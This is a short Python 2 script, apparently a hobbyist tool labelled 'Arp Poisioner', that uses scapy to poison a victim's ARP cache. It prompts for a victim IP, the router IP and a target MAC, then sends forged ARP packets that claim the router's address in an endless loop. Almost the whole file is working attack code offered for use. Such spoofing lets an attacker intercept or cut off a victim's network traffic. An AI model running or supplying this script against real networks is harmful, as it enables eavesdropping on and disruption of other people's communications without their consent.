#!/usr/bin/python

from scapy.all import *
from subprocess import call
import time


print((56 * '\033[31m-\033[1;m'))
print "\033[1;32mArp Poisioner : Made By Kunal \033[1;m"
print((56 * '\033[31m-\033[1;m'))


#Opcode for ARP Request is 1 , for reply is 2
opcode = 1
victimIP = raw_input('Enter the Victim IP Address: ')
victimIP = victimIP.replace(" ","")

spoof = raw_input('Enter the Router IP: ')
spoof = spoof.replace(" ","")

mac = raw_input('Enter the target MAC to hack: ')
mac = mac.replace("-",":")
mac = mac.replace(" ","")

arp= ARP(op=opcode , psrc=spoof , pdst=victimIP , hwdst=mac)

while 1:
    send(arp)
